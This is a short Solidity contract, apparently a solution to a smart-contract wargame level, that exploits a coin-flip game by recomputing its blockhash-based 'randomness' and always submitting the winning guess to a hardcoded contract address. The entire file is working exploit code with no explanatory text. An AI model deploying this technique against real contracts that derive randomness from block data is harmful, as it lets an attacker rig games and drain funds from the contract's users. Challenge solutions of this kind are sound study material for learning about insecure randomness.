// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface CoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack{
  CoinFlip public originalContract = CoinFlip(0xA998725a75ca2C6516e33fa8b9e312a37fAF3906);
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function hackFlip(bool _guess) public {
    uint256 blockVal = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockVal / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if(side == _guess){
      originalContract.flip(_guess);
    } else {
      originalContract.flip(!_guess);
    }
  }
}